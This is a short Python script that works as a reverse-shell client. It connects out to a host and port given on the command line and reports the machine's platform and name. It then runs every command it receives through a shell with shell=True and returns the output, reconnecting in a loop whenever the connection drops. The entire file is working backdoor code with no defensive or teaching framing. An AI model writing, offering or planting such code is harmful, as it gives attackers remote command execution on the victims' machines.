import socket
import subprocess
import platform
import sys
import time

def create_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    time.sleep(5)
    try:
        s.connect((ip, port))
        if not handshake(s):
            raise socket.error
        return s
    except socket.error:
        return None
def handshake(s):
    try:
        s.settimeout(5000)
        s.recv(1024)
        return True
    except socket.timeout:
        return False
def send_initial_info(s):
    init = f'''
platform \t{platform.platform()}
node     \t{platform.node()}
'''
    try:
        s.send(init.encode())
    except socket.error:
        pass

def execute_command(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return res.stdout if res.returncode == 0 else res.stderr
    except Exception:
        return "Error executing command"

def reconnect(ip, port):
    while True:
        print("rt...")
        s = create_socket(ip, port)
        if s:
            return s
        time.sleep(5)

def main():
    if len(sys.argv) < 2:
        return
    ip = socket.gethostbyname(sys.argv[1])
    port = int(sys.argv[2])
    s = None
    while True:
        if s is None or s.fileno() == -1:
            s = reconnect(ip, port)
            send_initial_info(s)
        try:
            while True:
                cmd = s.recv(1024).decode()
                output = execute_command(cmd.strip())
                s.send(output.encode())
                if cmd == "/21" or cmd == '':
                    raise socket.error
        except (socket.error, ConnectionResetError):
            s.close()
            s = None
main()

